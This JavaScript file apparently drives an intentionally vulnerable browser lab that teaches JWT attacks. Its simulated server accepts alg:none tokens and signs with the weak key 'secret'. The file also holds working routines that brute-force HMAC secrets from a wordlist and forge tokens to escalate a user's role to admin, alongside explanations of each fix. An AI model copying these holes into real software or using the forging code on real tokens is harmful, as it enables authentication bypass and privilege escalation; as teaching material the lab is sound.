// VULNERABLE BY DESIGN — Educational purposes only
// Demonstrates three JWT weaknesses:
//   1. Claim modification (role escalation when secret is known / weak)
//   2. alg:none — server accepts unsigned tokens
//   3. Weak secret brute-force (HMAC-SHA256 with "secret" as the key)
//
// All crypto is done with the Web Crypto API — no external libraries.

const WEAK_SECRET = "secret"; // intentionally weak signing key

const VALID_USERS = {
  alice: { password: "password123", role: "user",  uid: 101 },
  bob:   { password: "letmein99",   role: "user",  uid: 102 },
};

// ── Minimal JWT helpers ───────────────────────────────────────────────────────

function b64url(str) {
  return btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}

function b64urlDecode(str) {
  str = str.replace(/-/g, "+").replace(/_/g, "/");
  while (str.length % 4) str += "=";
  return atob(str);
}

async function hmacSign(header, payload, secret) {
  const enc  = new TextEncoder();
  const key  = await crypto.subtle.importKey(
    "raw", enc.encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false, ["sign"]
  );
  const data = enc.encode(`${header}.${payload}`);
  const sig  = await crypto.subtle.sign("HMAC", key, data);
  return b64url(String.fromCharCode(...new Uint8Array(sig)));
}

async function buildJWT(headerObj, payloadObj, secret, algNone = false) {
  const h = b64url(JSON.stringify(headerObj));
  const p = b64url(JSON.stringify(payloadObj));
  if (algNone) return `${h}.${p}.`;
  const s = await hmacSign(h, p, secret);
  return `${h}.${p}.${s}`;
}

function parseJWT(token) {
  const parts = token.split(".");
  if (parts.length !== 3) return null;
  try {
    return {
      header:  JSON.parse(b64urlDecode(parts[0])),
      payload: JSON.parse(b64urlDecode(parts[1])),
      sig:     parts[2],
    };
  } catch { return null; }
}

// ── Server-side token verification (simulated) ───────────────────────────────

async function serverVerify(token) {
  const parts = token.split(".");
  if (parts.length !== 3) return { ok: false, reason: "malformed token" };

  let header, payload;
  try {
    header  = JSON.parse(b64urlDecode(parts[0]));
    payload = JSON.parse(b64urlDecode(parts[1]));
  } catch { return { ok: false, reason: "invalid base64/JSON" }; }

  // VULNERABLE: server accepts alg:none with no signature
  if (header.alg === "none") {
    return { ok: true, payload, note: "alg:none accepted — no signature verified!" };
  }

  // Verify HMAC
  const expected = await hmacSign(parts[0], parts[1], WEAK_SECRET);
  if (expected !== parts[2]) {
    return { ok: false, reason: "signature verification failed" };
  }

  return { ok: true, payload };
}

// ── Brute-force weak secret ───────────────────────────────────────────────────

const COMMON_SECRETS = [
  "password", "secret", "123456", "qwerty", "admin",
  "jwt_secret", "mysecret", "changeme", "letmein", "supersecret",
];

async function bruteForceSecret(token) {
  const parts = token.split(".");
  for (const candidate of COMMON_SECRETS) {
    const sig = await hmacSign(parts[0], parts[1], candidate);
    if (sig === parts[2]) return candidate;
  }
  return null;
}

// ── Login → issue JWT ─────────────────────────────────────────────────────────

document.getElementById("loginForm").addEventListener("submit", async function (e) {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value;
  const errorMsg = document.getElementById("errorMsg");

  errorMsg.classList.add("hidden");

  const user = VALID_USERS[username];
  if (!user || user.password !== password) {
    errorMsg.classList.remove("hidden");
    return;
  }

  const headerObj  = { alg: "HS256", typ: "JWT" };
  const payloadObj = { sub: String(user.uid), username, role: user.role, iat: Math.floor(Date.now() / 1000) };

  const token = await buildJWT(headerObj, payloadObj, WEAK_SECRET);

  document.getElementById("jwtDisplay").textContent = token;
  document.getElementById("headerEditor").value  = JSON.stringify(headerObj,  null, 2);
  document.getElementById("payloadEditor").value = JSON.stringify(payloadObj, null, 2);
  document.getElementById("jwtSection").classList.remove("hidden");

  renderResponse({ ok: true, payload: payloadObj }, "Token issued.");
  document.getElementById("forgedDisplay").textContent = token;
});

// ── Forge & send ─────────────────────────────────────────────────────────────

document.getElementById("forgeBtn").addEventListener("click", async function () {
  const mode = document.getElementById("attackMode").value;
  const explanation = document.getElementById("explanationBox");

  let headerObj, payloadObj;

  try {
    headerObj  = JSON.parse(document.getElementById("headerEditor").value);
    payloadObj = JSON.parse(document.getElementById("payloadEditor").value);
  } catch {
    alert("Invalid JSON in header or payload editor.");
    return;
  }

  let forgedToken;
  let attackNote = "";

  if (mode === "algnone") {
    headerObj.alg = "none";
    forgedToken   = await buildJWT(headerObj, payloadObj, "", true);
    attackNote    = "alg:none — signature stripped";
  } else if (mode === "bruteforce") {
    const originalToken = document.getElementById("jwtDisplay").textContent.trim();
    const found = await bruteForceSecret(originalToken);
    if (found) {
      attackNote  = `Secret brute-forced: "${found}" — re-signing with discovered key`;
      forgedToken = await buildJWT(headerObj, payloadObj, found);
    } else {
      attackNote  = "Secret not found in wordlist.";
      forgedToken = await buildJWT(headerObj, payloadObj, WEAK_SECRET);
    }
  } else {
    forgedToken = await buildJWT(headerObj, payloadObj, WEAK_SECRET);
    attackNote  = "Re-signed with original secret";
  }

  document.getElementById("forgedDisplay").textContent = forgedToken + (attackNote ? `\n\n// ${attackNote}` : "");

  const result = await serverVerify(forgedToken);
  renderResponse(result, attackNote);

  explanation.classList.remove("hidden");

  const isEscalated = result.ok && result.payload && result.payload.role === "admin";

  if (mode === "algnone" && result.ok) {
    explanation.innerHTML = `
      <h3>alg:none attack succeeded.</h3>
      <p>The server accepted a token with no signature because it trusted the <code>alg</code> field inside the token header.</p>
      <ul>
        <li>JWT libraries that blindly read <code>alg</code> from the token can be tricked into skipping verification entirely.</li>
        <li>Set <code>"alg": "none"</code> in the header and remove the signature — the token becomes self-accepted.</li>
        <li>The fix: the server must hardcode the expected algorithm and never read it from the token itself.</li>
      </ul>`;
  } else if (mode === "bruteforce" && result.ok) {
    explanation.innerHTML = `
      <h3>Weak secret cracked — token re-signed.</h3>
      <p>The HMAC secret <code>"${WEAK_SECRET}"</code> was found by trying a short wordlist. With the secret, the attacker can forge any claims.</p>
      <ul>
        <li>HS256 tokens are only as secure as the secret used to sign them.</li>
        <li>Short or common secrets can be brute-forced offline using tools like <em>hashcat</em> or <em>jwt-cracker</em>.</li>
        <li>The fix: use a cryptographically random secret of at least 256 bits, or switch to RS256 (asymmetric).</li>
      </ul>`;
  } else if (isEscalated) {
    explanation.innerHTML = `
      <h3>Role escalated to admin.</h3>
      <p>You modified the <code>role</code> claim and the server accepted the forged token.</p>
      <ul>
        <li>JWT claims are just JSON — anyone can change them if the signing key is known or the signature is bypassed.</li>
        <li>Never store authoritative data (role, permissions) solely in a JWT without server-side validation.</li>
      </ul>`;
  } else if (!result.ok) {
    explanation.innerHTML = `
      <h3>Server rejected the token.</h3>
      <p>Signature verification failed — the token was modified but re-signed with the wrong key. Try the <strong>alg:none</strong> or <strong>brute-force</strong> attack modes.</p>`;
  } else {
    explanation.innerHTML = `
      <h3>Token accepted.</h3>
      <p>Try changing <code>"role"</code> to <code>"admin"</code> in the payload editor, then select an attack mode and forge again.</p>
      <ul>
        <li><strong>alg:none</strong> — removes the signature requirement entirely</li>
        <li><strong>Brute-force</strong> — discovers the weak secret and re-signs freely</li>
      </ul>`;
  }
});

function renderResponse(result, note) {
  const el = document.getElementById("serverResponse");
  if (result.ok) {
    const p = result.payload;
    el.innerHTML = `<span class="ok">200 OK</span>
User: ${p.username || p.sub}  |  role: ${p.role}  |  uid: ${p.sub}${result.note ? "\n\n⚠ " + result.note : ""}${note ? "\n// " + note : ""}`;
  } else {
    el.innerHTML = `<span class="err">401 Unauthorized</span>\n${result.reason}`;
  }
}
